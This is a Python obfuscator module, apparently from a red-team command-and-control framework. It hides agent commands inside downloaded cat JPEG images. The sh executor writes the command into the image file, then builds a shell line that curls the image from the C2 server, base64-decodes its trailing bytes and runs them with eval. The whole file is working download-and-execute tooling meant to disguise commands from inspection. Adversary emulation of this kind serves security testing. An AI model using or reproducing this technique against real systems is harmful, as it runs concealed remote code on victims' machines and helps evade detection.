from os import path

import requests

from app.utility.base_obfuscator import BaseObfuscator

REQUEST_TIMEOUT = 30


class Obfuscation(BaseObfuscator):

    @property
    def supported_platforms(self):
        return dict(
            darwin=['sh'],
            linux=['sh']
        )

    """ EXECUTORS """

    def sh(self, link):
        if not path.isfile('data/payloads/meow-%s.jpg' % link.id):
            response = requests.get('https://aws.random.cat/meow', verify=True, timeout=REQUEST_TIMEOUT)
            response.raise_for_status()
            data = response.json()
            img_response = requests.get(data['file'], verify=True, timeout=REQUEST_TIMEOUT)
            img_response.raise_for_status()
            with open('data/payloads/meow-%s.jpg' % link.id, 'wb') as meow:
                meow.write(img_response.content)
                meow.write(str.encode(link.command))
        return 'curl -s -X POST -H "file:meow-%s.jpg" %s/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' \
               % (link.id, self.get_config(prop='app.contact.http'), link.id, len(link.command), link.id)
